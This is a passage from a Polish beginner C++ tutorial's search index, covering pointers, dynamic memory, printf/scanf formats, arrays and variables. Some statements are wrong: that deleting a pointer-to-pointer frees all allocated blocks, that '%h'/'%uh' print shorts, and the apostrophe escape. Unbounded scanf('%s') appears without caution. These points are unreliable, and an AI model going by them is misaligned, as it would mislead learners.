kt\u00f3ra jest adresem elementu tablicy. Na ko\u0144cu ka\u017cdego obrotu p\u0119tli wska\u017anik przechodzi do nast\u0119pnego elementu tablicy.</p> <p>Wska\u017anika do tablicy mo\u017cemy tak\u017ce u\u017cy\u0107 w celu przekazania tablicy do funkcji. W tym celu nale\u017cy przekaza\u0107 adres pierwszego elementu tablicy do funkcji.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid printNumbers(int *ptr, int size) {\n    for (int i = 0; i &lt; size; i++) {\n        cout &lt;&lt; *ptr &lt;&lt; \" \";\n        ptr++;\n    }\n}\n\nint main() {\n    int numbers[] = {1, 2, 3, 4, 5};\n    int *ptr = numbers; // Ustawienie wska\u017anika na pierwszy element tablicy\n\n    printNumbers(ptr, 5);\n\n    return 0;\n}\n</code></pre> <p>W tym przyk\u0142adzie, wska\u017anik <code>ptr</code> przechowuje adres pierwszego elementu tablicy <code>numbers</code>. Funkcja <code>printNumbers</code> u\u017cywa tego wska\u017anika do wypisywania warto\u015bci z tablicy.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#dynamiczna-alokacja-pamieci","title":"Dynamiczna alokacja pami\u0119ci","text":"<p>W C++, dynamiczna alokacja pami\u0119ci pozwala na dynamiczne zarz\u0105dzanie pami\u0119ci\u0105 w czasie dzia\u0142ania programu. Mo\u017cemy za pomoc\u0105 funkcji <code>new</code> alokowa\u0107 nowe bloki pami\u0119ci, a nast\u0119pnie za pomoc\u0105 operatora <code>delete</code> zwolni\u0107 pami\u0119\u0107.</p> <pre><code>int *ptr = new int; // Alokacja nowego bloku pami\u0119ci o rozmiarze int\n*ptr = 10; // Przypisanie warto\u015bci do zmiennej, kt\u00f3ra jest adresem pierwszego elementu bloku pami\u0119ci\n\ndelete ptr; // Zwolnienie bloku pami\u0119ci\nptr = nullptr; // Przypisanie wska\u017anikowi null, aby upewni\u0107 si\u0119, \u017ce nie b\u0119dzie wykorzystywany\n</code></pre> <p>W tym przyk\u0142adzie, za pomoc\u0105 operatora <code>new</code> alokujemy nowy blok pami\u0119ci o rozmiarze <code>int</code>, a nast\u0119pnie przypisujemy warto\u015b\u0107 10 do zmiennej, kt\u00f3ra jest adresem pierwszego elementu bloku pami\u0119ci. Na koniec, za pomoc\u0105 operatora <code>delete</code> zwalniamy blok pami\u0119ci i przypisujemy do wska\u017anika warto\u015b\u0107 pust\u0105, co jest dobr\u0105 praktyk\u0105 w kontek\u015bcie bardziej rozbudowanych program\u00f3w, poniewa\u017c p\u00f3\u017aniej mo\u017cemy \u0142atwo sprawdzi\u0107 za pomoc\u0105 prostego warunku, czy wska\u017anik jest zainicjowany.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wyciek-pamieci","title":"Wyciek pami\u0119ci","text":"<p>Gdy sami alokujemy nowy blok pami\u0119ci, nale\u017cy pami\u0119ta\u0107, \u017ce powinni\u015bmy ten blok tak\u017ce sami zwolni\u0107. Je\u017celi tego nie zrobimy, a przypiszemy wska\u017anik do nowego bloku pami\u0119ci, to zostawiamy w pami\u0119ci stary blok, do kt\u00f3rego nie mamy ju\u017c odwo\u0142ania i nie mamy mo\u017cliwo\u015bci go zwolni\u0107. W ten spos\u00f3b nasz program mo\u017ce zu\u017cywa\u0107 znacznie wi\u0119cej pami\u0119ci, ni\u017c powinien. Dlatego bardzo wa\u017cne jest zwalnianie dynamicznie alokowanej pami\u0119ci.</p> <p>Poni\u017cszy przyk\u0142ad pokazuje, co mo\u017ce si\u0119 wydarzy\u0107, gdy b\u0119dziemy alokowa\u0107 nowe bloki w pami\u0119ci bez zwalniania poprzednich. </p> <p>Warning</p> <p>Uwaga</p> <p>Przed uruchomieniem programu na swoim komputerze upewnij si\u0119, \u017ce nie utracisz danych, je\u017celi b\u0119dzie potrzeba zrestartowa\u0107 system.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int *ptr;\n    while(true) {\n        ptr = new int;\n    }\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/pointers/#tablice-dynamiczne","title":"Tablice dynamiczne","text":"<p>W C++, tablice dynamiczne s\u0105 tablicami, kt\u00f3re mog\u0105 rozszerza\u0107 si\u0119 w czasie dzia\u0142ania programu. Mo\u017cemy za pomoc\u0105 funkcji <code>new</code> alokowa\u0107 nowe bloki pami\u0119ci, a nast\u0119pnie za pomoc\u0105 operatora <code>delete</code> zwolni\u0107 pami\u0119\u0107.</p> <pre><code>int *ptr = new int[5]; // Alokacja nowej tablicy o rozmiarze 5\n\ndelete[] ptr; // Zwolnienie tablicy\nptr = nullptr; // Przypisanie wska\u017anikowi null, aby upewni\u0107 si\u0119, \u017ce nie b\u0119dzie wykorzystywany\n</code></pre> <p>W tym przyk\u0142adzie, za pomoc\u0105 operatora <code>new</code> alokujemy now\u0105 tablic\u0119 o rozmiarze 5, a nast\u0119pnie za pomoc\u0105 operatora <code>delete[]</code> zwalniamy tablic\u0119 i podobnie jak wcze\u015bniej przypisujemy do wska\u017anika warto\u015b\u0107 null.</p> <p>Je\u017celi chcieliby\u015bmy zwi\u0119kszy\u0107 rozmiar naszej tablicy, nale\u017cy najpierw zaalokowa\u0107 tablic\u0119 o wi\u0119kszym rozmiarze, a nast\u0119pnie skopiowa\u0107 zawarto\u015b\u0107 tablicy do nowej tablicy. Na koniec mo\u017cemy zwolni\u0107 poprzedni\u0105 tablic\u0119 i zapami\u0119ta\u0107 wska\u017anik do nowej tablicy.</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    int *ptr = new int[5]; // Alokacja tablicy o rozmiarze 5\n    int *tmp = new int[10]; // Alokacja tablicy o rozmiarze 10\n\n    copy(ptr, ptr + 5, tmp); // Skopiowanie zawarto\u015bci tablicy do nowej tablicy\n\n    delete[] ptr; // Zwolnienie poprzedniej tablicy\n\n    ptr = tmp; // Zapami\u0119tanie wska\u017anika do nowej tablicy\n\n    return 0;\n}\n</code></pre> <p>W tym przyk\u0142adzie, najpierw alokujemy tablic\u0119 o rozmiarze 5, a nast\u0119pnie wi\u0119ksz\u0105 tablic\u0119 o rozmiarze 10. W kolejnym kroku kopiujemy zawarto\u015b\u0107 tablicy o rozmiarze 5 do nowej tablicy o rozmiarze 10 korzystaj\u0105c z funkcji <code>copy</code> znajduj\u0105cej si\u0119 w bibliotece algorithm. Na ko\u0144cu zwalniamy tablic\u0119 o rozmiarze 5 i zapami\u0119tujemy wska\u017anik do nowej tablicy. Zwr\u00f3\u0107my uwag\u0119 na to, \u017ce nie mo\u017cemy zwolni\u0107 wska\u017anika kryj\u0105cego si\u0119 pod zmienn\u0105 <code>tmp</code>, poniewa\u017c pod tym adresem kryje si\u0119 ju\u017c nowa tablica, wskazywana tak\u017ce przez wska\u017anik <code>ptr</code>.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wskazniki-do-wskaznikow","title":"Wska\u017aniki do wska\u017anik\u00f3w","text":"<p>W C++, wska\u017aniki do wska\u017anik\u00f3w pozwalaj\u0105 na tworzenie hierarchii wska\u017anik\u00f3w. Wska\u017anik do wska\u017anika to specialny wska\u017anik, kt\u00f3ry przechowuje adres innego wska\u017anika. Wska\u017anik do wska\u017anika mo\u017ce by\u0107 u\u017cyty do przechowywania wska\u017anik\u00f3w do innych struktur danych, takich jak tablice, kontenery czy listy.</p> <pre><code>int **ptr_to_ptr = new int*; // Alokacja nowego bloku pami\u0119ci o rozmiarze int*\nint *ptr = new int; // Alokacja nowego bloku pami\u0119ci o rozmiarze int\n\n*ptr = 10; // Przypisanie warto\u015bci do zmiennej, kt\u00f3ra jest adresem pierwsego elementu bloku pami\u0119ci\n*ptr_to_ptr = ptr; // Przypisanie adresu do wska\u017anika do wska\u017anika\n\ndelete ptr; // Zwolnienie bloku pami\u0119ci\nptr = nullptr; // Ustawienie wska\u017anika na nullptr\n\ndelete ptr_to_ptr; // Zwolnienie bloku pami\u0119ci\nptr_to_ptr = nullptr; // Ustawienie wska\u017anika do wska\u017anika na nullptr\n</code></pre> <p>W tym przyk\u0142adzie, za pomoc\u0105 operatora <code>new</code> alokujemy nowy blok pami\u0119ci o rozmiarze int*, a nast\u0119pnie alokujemy nowy blok pami\u0119ci o rozmiarze int. Nast\u0119pnie przypisujemy warto\u015b\u0107 10 do zmiennej, kt\u00f3ra jest adresem pierwszego elementu bloku pami\u0119ci. Na koniec, przypisujemy adres tej zmiennej do wska\u017anika do wska\u017anika.</p> <p>Wywo\u0142anie funkcji <code>delete</code> na wska\u017aniku do wska\u017anika zwolni wszystkie bloki pami\u0119ci, kt\u00f3re by\u0142y alokowane za pomoc\u0105 operatora <code>new</code>.</p> <p>W ten spos\u00f3b, wska\u017anik do wska\u017anika pozwala na tworzenie hierarchii wska\u017anik\u00f3w, co mo\u017ce by\u0107 u\u017cyte do przechowywania wska\u017anik\u00f3w do innych struktur danych.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wskazniki-do-funkcji","title":"Wska\u017aniki do funkcji","text":"<p>W C++, wska\u017aniki do funkcji mog\u0105 by\u0107 u\u017cywane do przechowywania adres\u00f3w funkcji. Niekt\u00f3re funkcje mog\u0105 by\u0107 przekazywane do innych funkcji jako parametry, a nast\u0119pnie wywo\u0142ywane z u\u017cyciem wska\u017anik\u00f3w do funkcji.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid print(int value) {\n    cout &lt;&lt; \"Warto\u015b\u0107: \" &lt;&lt; value &lt;&lt; endl;\n}\n\nint main() {\n    int num = 10;\n    void (*ptr_to_func)(int) = &amp;print; // Przechowanie adresu funkcji print we wska\u017aniku do funkcji\n    (*ptr_to_func)(num); // Wywo\u0142anie funkcji print z u\u017cyciem wska\u017anika do funkcji\n    return 0;\n}\n</code></pre> <p>W tym przyk\u0142adzie, wska\u017anik <code>ptr_to_func</code> przechowuje adres funkcji <code>print</code>. Nast\u0119pnie, wywo\u0142ujemy funkcj\u0119 <code>print</code> z u\u017cyciem wska\u017anika do funkcji, przekazuj\u0105c mu warto\u015b\u0107 <code>num</code>.</p>"},{"location":"programming/c%2B%2B/introduction/pointers/#wskazniki-do-struktur-danych","title":"Wska\u017aniki do struktur danych","text":"<p>W C++, wska\u017aniki do struktur danych mog\u0105 by\u0107 u\u017cywane do przechowywania adres\u00f3w do struktur danych. Niekt\u00f3re funkcje, takie jak operacje na plikach, mog\u0105 wymaga\u0107 przekazania wska\u017anika do struktury danych, aby m\u00f3c dokona\u0107 operacji na pliku.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstruct MyStruct {\n    int value;\n    string name;\n};\n\nvoid print_struct(const MyStruct* ptr) {\n    cout &lt;&lt; \"Warto\u015b\u0107: \" &lt;&lt; ptr-&gt;value &lt;&lt; endl;\n    cout &lt;&lt; \"Nazwa: \" &lt;&lt; ptr-&gt;name &lt;&lt; endl;\n}\n\nint main() {\n    MyStruct my_struct = {10, \"ten\"};\n    print_struct(&amp;my_struct); // Przekazanie wska\u017anika do struktury danych\n    return 0;\n}\n</code></pre> <p>W tym przyk\u0142adzie, wska\u017anik <code>ptr</code> przechowuje adres do struktury <code>my_struct</code>. Nast\u0119pnie, wywo\u0142ujemy funkcj\u0119 <code>print_struct</code>, przekazuj\u0105c wska\u017anik do <code>my_struct</code>. Nale\u017cy zauwa\u017cy\u0107, \u017ce w celu odczytania warto\u015bci kryj\u0105cych si\u0119 pod wska\u017anikiem, zamiast operatora kropki korzystamy z operatora <code>-&gt;</code>. Alternatywnie mogliby\u015bmy tak\u017ce zapisa\u0107 <code>(*ptr).value</code>.</p>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/","title":"Funkcje printf i scanf","text":""},{"location":"programming/c%2B%2B/introduction/printf-scanf/#znaki-specjalne","title":"Znaki specjalne","text":"<ul> <li> - znak nowej linii</li> <li> - tabulacja pozioma</li> <li><code>\\v</code> - tabulacja pionowa</li> <li><code>\\b</code> - backspace</li> <li><code>\\a</code> - alarm</li> <li><code>\\\\</code> - backslash</li> <li><code>\\?</code> - znak</li> <li><code>\\`</code> - apostrof</li> <li><code>\\\"</code> - cudzys\u0142\u00f3w</li> </ul>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#formaty-typow","title":"Formaty typ\u00f3w","text":"Typ Format <code>char</code> <code>%c</code> <code>unsigned char</code> <code>%c</code> <code>short</code> <code>%h</code> <code>unsigned short</code> <code>%uh</code> <code>int</code> <code>%d</code>, <code>%i</code> <code>unsigned int</code> <code>%u</code> <code>long int</code> <code>%ld</code> <code>unsigned long int</code> <code>%lu</code> <code>long long int</code> <code>%lld</code> <code>unsigned long long int</code> <code>%llu</code> <code>float</code> <code>%f</code>, <code>%F</code> <code>double</code> <code>%lf</code> <code>long double</code> <code>%Lf</code> <code>char*</code> <code>%s</code>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#formaty-specjalne","title":"Formaty specjalne","text":"Opis Format notacja naukowa <code>%e</code>, <code>%E</code> notacja standardowa lub naukowa, w zale\u017cno\u015bci od wielko\u015bci liczby <code>%g</code>, <code>%G</code> <code>unsigned int</code>w formacie oktalnym (\u00f3semkowym) <code>%o</code> <code>unsigned int</code> w formacie heksadecymalnym (szesnastkowym) <code>%x</code>, <code>%X</code> <code>double</code>w formacie heksadecymalnym (szesnastkowym) <code>%a</code>, <code>%A</code>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#biblioteka","title":"Biblioteka","text":"<p>Funkcje <code>printf</code> oraz <code>scanf</code> znajduj\u0105 si\u0119 w standardowej bibliotece wej\u015bcia/wyj\u015bcia (standard input/output):</p> <pre><code>#include &lt;cstdio&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#printf","title":"Printf","text":"<p>Funkcja <code>printf</code> przyjmuje dwa argumenty:</p> <ul> <li>format wypisywanego komunikatu,</li> <li>list\u0119 oddzielonych przecinkami warto\u015bci do podstawienia.</li> </ul> <p>Format jest standardowym tekstem, kt\u00f3ry mo\u017ce zawiera\u0107 specjalne symbole okre\u015blaj\u0105ce, \u017ce w tym miejscu komunikatu ma zosta\u0107 podstawiona kolejna warto\u015b\u0107, przekazana jako drugi argument.</p> <p>Funkcji <code>printf</code> mo\u017cemy tak\u017ce u\u017cy\u0107 do wypisania komunikatu bez podawania warto\u015bci do podstawienia.</p> <pre><code>printf(\"Hello World!\");\n</code></pre> <p>Ka\u017cdy symbol specjalny sk\u0142adaj\u0105cy si\u0119 ze znaku <code>%</code> i litery oznacza, \u017ce w to miejsce nale\u017cy wstawi\u0107 odpowiedni\u0105 warto\u015b\u0107. Np. <code>%d</code> w formacie zostanie zast\u0105piony warto\u015bci\u0105 typu <code>int</code> podan\u0105 jako kolejny argument funkcji <code>printf</code>.</p> <pre><code>printf(\"%d\", 68); // 68\nprintf(\"Wynik to %d\", 24); // Wynik to 24\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#string","title":"String","text":"<p>Najprostszym sposobem na wypisanie zmiennej typu <code>string</code>za pomoc\u0105 funkcji <code>printf</code>, jest przekonwertowanie zmiennej na ci\u0105g znak\u00f3w z j\u0119zyka C (<code>const char*</code>) z u\u017cyciem funkcji <code>c_str()</code>.</p> <pre><code>string txt = \"Hello World!\";\nprintf(\"%s\", txt.c_str()); // Hello World!\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#formatowanie-szerokosci","title":"Formatowanie szeroko\u015bci","text":"<p>Mo\u017cemy wypisa\u0107 warto\u015b\u0107 w polu o zadanej minimalnej szeroko\u015bci. Aby to zrobi\u0107, bezpo\u015brednio po znaku % podajemy liczb\u0119 okre\u015blaj\u0105c\u0105 szeroko\u015b\u0107 pola. Domy\u015blnie warto\u015bci b\u0119d\u0105 wyr\u00f3wnywane do prawej.</p> <pre><code>printf(\"%3d\", 0); \nprintf(\"%3d\", 123456789); \nprintf(\"%8d\", -10);\n</code></pre> <p>Aby wyr\u00f3wna\u0107 warto\u015bci do lewej, nale\u017cy poda\u0107 szeroko\u015b\u0107 pola jako liczb\u0119 ujemn\u0105.</p> <pre><code>printf(\"%-3d\", 0);\nprintf(\"%-3d\", 123456789);\nprintf(\"%-8d\", -10);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#uzupenienie-do-szerokosci-pola","title":"Uzupe\u0142nienie do szeroko\u015bci pola","text":"<p>Wypisywan\u0105 warto\u015b\u0107 liczbow\u0105 mo\u017cemy uzupe\u0142ni\u0107 zerami z lewej strony do wymaganej szeroko\u015bci pola. W tym celu piszemy %0, zadan\u0105 szeroko\u015b\u0107 pola i znak formatu.</p> <pre><code>printf(\"%03d\", 0); // 000\nprintf(\"%08d\", 12); // 00000012\nprintf(\"%02d:%02d\", 14, 5); // 14:05\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#liczby-rzeczywiste","title":"Liczby rzeczywiste","text":"<p>Domy\u015blnie przy wypisywaniu liczb rzeczywistych zostan\u0105 one wypisane z dok\u0142adno\u015bci\u0105 do 6 miejsc po przecinku. Mo\u017cemy to jednak zmieni\u0107, pisz\u0105c %. i zadan\u0105 dok\u0142adno\u015b\u0107. Warto\u015b\u0107 zostanie zaokr\u0105glona do zadanej liczby miejsc po przecinku.</p> <pre><code>printf(\"%f\", 12.85); // 12.850000\nprintf(\"%.2f\", 12.85); // 12.85\nprintf(\"%.1f\", 12.85); // 12.9\n</code></pre> <p>Mo\u017cemy tak\u017ce po\u0142\u0105czy\u0107 okre\u015blenie szeroko\u015bci pola z dok\u0142adno\u015bci\u0105 do zadanej liczby miejsc po przecinku. Nale\u017cy pami\u0119ta\u0107, \u017ce szeroko\u015b\u0107 uwzgl\u0119dnia ca\u0142\u0105 liczb\u0119, \u0142\u0105cznie ze znakiem kropki.</p> <pre><code>printf(\"%6.2f\", 12.85); // 12.85\nprintf(\"%06.2f\", 12.85); // 012.85\nprintf(\"%-6.2f\", 12.85);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#notacja-naukowa","title":"Notacja naukowa","text":"<p>W celu wypisania liczby rzeczywistej w formacie naukowym u\u017cywamy formatu <code>%e</code>.</p> <pre><code>printf(\"%e\", 5.65); // 5.650000e+00\nprintf(\"%e\", 5.653745343438343); // 5.653745e+00\nprintf(\"%e\", 4342342343245.0); // 4.342342e+12\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#znak-liczby","title":"Znak liczby","text":"<p>Aby zawsze wypisywa\u0107 znak liczby, a nie tylko przy warto\u015bciach ujemnych, mo\u017cemy poda\u0107 znak \\(+\\) przed liter\u0105 formatu.</p> <pre><code>printf(\"%+d\", 5); // +5\nprintf(\"%+d\", -5); // -5\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#inne-systemy-liczbowe","title":"Inne systemy liczbowe","text":"<p>Za pomoc\u0105 <code>printf</code> mo\u017cemy w \u0142atwy spos\u00f3b wypisa\u0107 liczb\u0119 naturaln\u0105 w systemie oktalnym lub heksadecymalnym. S\u0142u\u017c\u0105 do tego odpowiednio formaty <code>%o</code> i <code>%x</code>.</p> <pre><code>printf(\"%o\", 127); // 177\nprintf(\"%x\", 127); // 7f\nprintf(\"%X\", 127); // 7F\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#link-do-przykadow","title":"Link do przyk\u0142ad\u00f3w","text":"<p>Printf - przyk\u0142ady</p>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#scanf","title":"Scanf","text":"<p>Funkcja <code>scanf</code> pozwala nam wczyta\u0107 dane od u\u017cytkownika. Jej u\u017cycie wygl\u0105da podobnie do <code>printf</code>. Najpierw podajemy format, a nast\u0119pnie zmienne, do kt\u00f3rych chcemy wczyta\u0107 poszczeg\u00f3lne warto\u015bci. W formacie zazwyczaj ograniczamy si\u0119 do podania format\u00f3w wczytywanych warto\u015bci. Zmienne natomiast musz\u0105 by\u0107 podane jako adres w pami\u0119ci, pod kt\u00f3rym nale\u017cy zapisa\u0107 wczytan\u0105 warto\u015b\u0107. Dlatego zazwyczaj zmienne poprzedzamy symbolem <code>&amp;</code>.</p> <pre><code>int a;\nscanf(\"%d\", &amp;a);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#ignorowanie-znaku","title":"Ignorowanie znaku %","text":"<p>Mo\u017cemy zignorowa\u0107 znak % podany na wej\u015bciu.</p> <pre><code>int a;\nscanf(\"%d%%\", &amp;a);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#inne-systemy-liczbowe_1","title":"Inne systemy liczbowe","text":"<p>Podobnie jak w przypadku <code>printf</code>, <code>scanf</code> mo\u017cemy u\u017cy\u0107 do wczytania liczb w formatach oktalnym i heksadecymalnym.</p> <pre><code>int a, b;\nscanf(\"%o\", &amp;a); // 012\nscanf(\"%x\", &amp;b); // Af\nprintf(\"a = %d, b = %d\", a, b); // a = 10, b = 175\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#wczytywanie-tekstow","title":"Wczytywanie tekst\u00f3w","text":"<p>Podobnie jak <code>printf</code>, <code>scanf</code> tak\u017ce nie obs\u0142uguje typu string. Mo\u017cemy zamiast tego wczyta\u0107 tekst do tablicy typu char. W przypadku tablic nie podajemy znaku <code>&amp;</code>, poniewa\u017c nazwa zmiennej tablicowej zwraca adres w pami\u0119ci, gdzie znajduje si\u0119 pocz\u0105tek tablicy.</p> <pre><code>char txt[100];\nscanf(\"%s\", txt);\n</code></pre> <p>Alternatywnie:</p> <pre><code>char txt[100];\nscanf(\"%s\", &amp;txt[0]);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#ignorowanie-wejscia","title":"Ignorowanie wej\u015bcia","text":"<p>Aby wczyta\u0107 i zignorowa\u0107 wej\u015bcie (lub jego fragment), czyli nie przypisywa\u0107 warto\u015bci do zmiennej, mo\u017cemy po znaku <code>%</code> da\u0107 <code>*</code>.</p> <pre><code>int a;\nscanf(\"%*s %d\", &amp;a);  // Age : 29\nprintf(\"a = %d\", a);  // a = 29\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#maksymalna-dugosc-wejscia","title":"Maksymalna d\u0142ugo\u015b\u0107 wej\u015bcia","text":"<p>Mo\u017cemy okre\u015bli\u0107, ile maksymalnie znak\u00f3w ma zosta\u0107 wczytanych. Reszta danych zostanie zignorowana.</p> <pre><code>int a;\nscanf(\"%2d\", &amp;a);     // 1234\nprintf(\"a = %d\", a);  // a = 12\n</code></pre> <p>Mo\u017cemy te\u017c nie ignorowa\u0107 reszty wej\u015bcia i przypisa\u0107 je do kolejnej zmiennej.</p> <pre><code>int a, b;\nscanf(\"%2d%d\", &amp;a, &amp;b);          // 1234\nprintf(\"a = %d, b = %d\", a, b);  // a = 12, b = 34\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#koniec-wejscia","title":"Koniec wej\u015bcia","text":"<p>W momencie napotkania ko\u0144ca wej\u015bcia, funkcja <code>scanf</code> zwr\u00f3ci sta\u0142\u0105 <code>EOF</code>. W celu wczytywania wej\u015bcia a\u017c do jego ko\u0144ca mo\u017cemy wi\u0119c np. zastosowa\u0107 tak\u0105 p\u0119tl\u0119:</p> <pre><code>int a;\nwhile(scanf(\"%d\", &amp;a) != EOF) {\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/printf-scanf/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"programming/c%2B%2B/introduction/static-arrays/","title":"Tablice statyczne","text":"<p>Tablice statyczne charakteryzuj\u0105 si\u0119 tym, \u017ce maj\u0105 ustalony rozmiar. Gdy raz utworzymy tablic\u0119 statyczn\u0105, to nie mo\u017cemy ju\u017c zmienia\u0107 jej rozmiaru.</p> <p>Info</p> <p>Elementy w tablicy indeksujemy (numerujemy) od \\(0\\).</p>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#inicjalizacja-tablicy","title":"Inicjalizacja tablicy","text":""},{"location":"programming/c%2B%2B/introduction/static-arrays/#tablica-o-zadanej-dugosci-bez-zdefiniowanych-wartosci-poczatkowych","title":"Tablica o zadanej d\u0142ugo\u015bci, bez zdefiniowanych warto\u015bci pocz\u0105tkowych","text":"<pre><code>int tab[10];\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#inicjalizacja-danymi-poczatkowymi","title":"Inicjalizacja danymi pocz\u0105tkowymi","text":"<pre><code>int tab[5] = {1, 2, 3, 4, 5};\n</code></pre> <p>Gdy podamy mniej warto\u015bci, ni\u017c wskazuje d\u0142ugo\u015b\u0107 tablicy, to pozosta\u0142e miejsca zostan\u0105 wype\u0142nione warto\u015bci\u0105 domy\u015bln\u0105 dla danego typu (np. \\(0\\) dla liczb).</p> <pre><code>int tab[10] = {1, 2, 3, 4, 5};\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#tablica-o-dugosci-zadanej-przez-zmienna","title":"Tablica o d\u0142ugo\u015bci zadanej przez zmienn\u0105","text":"<p>Mo\u017cemy utworzy\u0107 tablic\u0119 statyczn\u0105 podaj\u0105c jej rozmiar za pomoc\u0105 zmiennej. W takim przypadku nie mo\u017cemy jednak zainicjalizowa\u0107 tablicy danymi pocz\u0105tkowymi tak jak pokazano powy\u017cej.</p> <pre><code>int n = 10;\nint tab[n];\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#podstawowe-operacje","title":"Podstawowe operacje","text":""},{"location":"programming/c%2B%2B/introduction/static-arrays/#odczytanie-wartosci-pod-zadanym-indeksem","title":"Odczytanie warto\u015bci pod zadanym indeksem","text":"<pre><code>cout &lt;&lt; tab[2] &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#zmiana-wartosci-pod-zadanym-indeksem","title":"Zmiana warto\u015bci pod zadanym indeksem","text":"<pre><code>tab[2] = 10;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#iteracja-po-tablicy","title":"Iteracja po tablicy","text":"<pre><code>int tab[5] = {1, 2, 3, 4, 5};\nfor (int i = 0; i &lt; 5; i++) {\n    cout &lt;&lt; tab[i] &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/static-arrays/#iteracja-petla-for-in","title":"Iteracja p\u0119tl\u0105 for in","text":"<pre><code>int tab[5] = {1, 2, 3, 4, 5};\nfor (int el : tab) {\n    cout &lt;&lt; el &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/template/","title":"Szablon","text":"<p>J\u0119zyk C++ ma swoj\u0105 bardzo konkretn\u0105 struktur\u0119. Ka\u017cdy program konsolowy zaczniemy tworzy\u0107 od szablonu pokazanego poni\u017cej, lub bardzo zbli\u017conego. G\u0142\u00f3wn\u0105 cz\u0119\u015bci\u0105 programu jest funkcja main.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/variables/","title":"Wprowadzenie do zmiennych","text":""},{"location":"programming/c%2B%2B/introduction/variables/#nazewnictwo-zmiennych","title":"Nazewnictwo zmiennych","text":"<p>W nazwach zmiennych mo\u017cemy u\u017cywa\u0107 jedynie nast\u0119puj\u0105cych znak\u00f3w:</p> <ul> <li>Ma\u0142e i wielkie litery alfabetu angielskiego: \\([a-z],[A-Z]\\) </li> <li>Cyfry: \\([0-9]\\) </li> <li>Znak pod\u0142ogi: \\(\\_\\) </li> </ul> <p>Jest wiele r\u00f3\u017cnych sposob\u00f3w nazywania zmiennych. Najwa\u017cniejsze jest, \u017ceby trzyma\u0107 si\u0119 jednego sposobu w ca\u0142ym kodzie. My b\u0119dziemy korzysta\u0107 z notacji camelCase, w kt\u00f3rej nazwy zmiennych zaczynamy od ma\u0142ej litery, a ka\u017cdy kolejny cz\u0142on zaczynamy od wielkiej litery.</p>"},{"location":"programming/c%2B%2B/introduction/variables/#przykad","title":"Przyk\u0142ad","text":"<pre><code>int liczbaCalkowita;\ndouble rzeczywista;\nstring daneNowegoUsera;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/variables/#prezentacja","title":"Prezentacja","text":"<p> Wprowadzenie do zmiennych - C++</p>"},{"location":"programming/c%2B%2B/introduction/oop/","title":"Programowanie obiektowe","text":""},{"location":"programming/c%2B%2B/introduction/oop/#opis-zagadnienia","title":"Opis zagadnienia","text":"<p>programowanie-obiektowe.md</p>"},{"location":"programming/c%2B%2B/introduction/oop/#wstep","title":"Wst\u0119p","text":"<p>J\u0119zyk C++ jest mieszank\u0105 podej\u015bcia proceduralnego i obiektowego. Jego proceduralne korzenie s\u0105 bardzo silne i z tego wzgl\u0119du nie jest je\u017cykiem w pe\u0142ni obiektowym. Niemniej praca z klasami w C++ potrafi nieraz u\u0142atwi\u0107 rozwi\u0105zanie danego problemu. W tym rozdziale przybli\u017cymy podstawowe konstrukcje zwi\u0105zane z programowaniem obiektowym w j\u0119zyku C++.</p>"},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/","title":"Klasy abstrakcyjne","text":""},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/#wstep","title":"Wst\u0119p","text":"<p>Klasy abstrakcyjne to konstrukcje, kt\u00f3re s\u0105 przydatne przy tworzeniu zaawansowanych struktur relacji dziedziczenia. Klasa abstrakcyjna mo\u017ce pos\u0142u\u017cy\u0107 za klas\u0119 bazow\u0105, kt\u00f3ra agreguje funkcjonalno\u015bci sp\u00f3jne dla kas pochodnych.</p>"},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/#klasy-abstrakcyjne_1","title":"Klasy 